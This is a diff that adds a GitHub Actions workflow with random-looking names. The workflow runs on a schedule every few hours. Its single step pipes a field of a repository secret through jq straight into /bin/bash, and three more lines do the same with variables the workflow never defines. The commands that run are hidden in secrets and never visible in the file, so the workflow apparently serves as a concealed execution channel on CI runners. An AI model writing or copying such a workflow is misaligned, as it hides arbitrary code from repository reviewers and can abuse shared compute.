@@ -1,0 +1,19 @@
+name: yaosiwang6712
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaosiwang6712
+        env:
+          u5743: ${{ secrets.u5743 }}
+        run: |
+          echo $u5743 | jq -r .k69 | /bin/bash
+          echo $vyd99 | jq -r .zv5 | /bin/bash
+          echo $m06 | jq -r .lhg32 | /bin/bash
+          echo $i2603 | jq -r .ao9647 | /bin/bash
+
